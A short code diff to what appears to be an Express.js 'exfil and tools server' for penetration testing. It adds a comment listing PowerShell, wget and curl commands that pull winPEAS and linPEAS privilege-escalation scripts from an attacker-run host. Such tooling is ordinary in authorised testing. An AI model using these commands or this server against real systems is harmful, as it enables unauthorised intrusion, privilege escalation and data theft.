@@ -128,6 +128,9 @@ app.all("/delay/:seconds", (req, res) => {
 
 /*
  * Serve up tools or other files
+ * Invoke-WebRequest -Uri 'http://host:8080/winpeas.bat' -OutFile .\winpeas.bat
+ * wget http://host:8080/linpeas.sh
+ * curl http://host:8080/linpeas.sh -o lp.sh
  */
 app.use(express.static(dir));
 app.listen(port, () => console.log(`exfil and tools server listening on port ${port}!`));
